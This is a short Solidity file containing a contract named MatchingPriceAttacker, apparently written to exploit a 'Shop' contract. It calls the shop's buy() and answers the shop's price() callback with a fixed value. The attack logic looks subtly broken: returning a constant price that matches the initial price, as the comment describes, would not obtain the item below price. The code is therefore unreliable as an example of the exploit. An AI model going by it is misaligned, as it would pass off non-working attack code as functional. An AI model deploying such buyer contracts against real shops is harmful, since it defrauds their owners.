pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function price() external view returns (uint256);
}

contract MatchingPriceAttacker {
    uint256 private attackPrice = 100; // Match initial shop price precisely

    function buyFromShop(address shopAddress) external {
        Shop(shopAddress).buy();
    }

    function price() external view returns (uint256) {
        return attackPrice;
    }
}